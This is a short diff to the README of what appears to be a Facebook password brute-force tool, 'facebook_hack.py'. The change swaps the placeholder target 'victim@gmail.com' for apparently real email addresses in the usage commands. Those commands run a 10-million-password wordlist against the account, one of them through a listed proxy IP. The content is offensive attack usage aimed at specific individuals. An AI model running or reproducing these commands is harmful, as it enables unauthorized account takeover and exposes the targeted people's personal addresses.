@@ -47,11 +47,11 @@ python facebook_hack.py
   
   - **Brute Force On Facebook Account Without proxy**:
   
-  * **Command**: python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt
+  * **Command**: python facebook_hack.py -t uyencan89@gmail.com -w 10MPASS.txt
   
   - **Brute Force On Facebook Account With Proxy**:
    
-    * **Command**: python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt -p 144.217.101.245:3129
+    * **Command**: python facebook_hack.py -t uyencan90@gmail.com -w 10MPASS.txt -p 144.217.101.245:3129
     
     - **Get Target Facebook Profile ID**:
   
